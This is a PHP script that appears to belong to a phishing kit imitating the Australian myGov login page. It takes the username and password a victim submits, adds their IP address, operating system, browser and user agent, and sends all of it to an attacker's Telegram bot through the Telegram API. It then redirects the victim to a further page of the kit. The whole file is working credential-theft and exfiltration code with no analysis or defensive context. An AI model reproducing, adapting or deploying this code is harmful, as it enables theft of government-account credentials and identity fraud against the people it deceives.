<?php

include'./tginfo.php';
include'./agent.php';

$usr = $_POST['usr'];
$pwd = $_POST['pwd'];
$ip = getenv("REMOTE_ADDR");

if (!empty($usr) AND !empty($pwd)) {
	$coronamsg .= "⚜️ myGov Information:\n";
	$coronamsg .= "Username: $usr\n";
	$coronamsg .= "Password: $pwd\n";
	$coronamsg .= "\n";
	$coronamsg .= "⚜️ User Information:\n";
	$coronamsg .= "Geo Ip: $ip\n";
	$coronamsg .= "User OS: $user_os\n";
	$coronamsg .= "User Browser: $user_browser\n";
	$coronamsg .= "User Agent: $user_agent\n";
	$token = "$coronatoken";
    $data = [
    'text' => $coronamsg,
    'chat_id' => $coronachat,
    ];file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data) );
    header('Location: ../add.php');
}
else{
    header('Location: ../index.php');
}

 ?>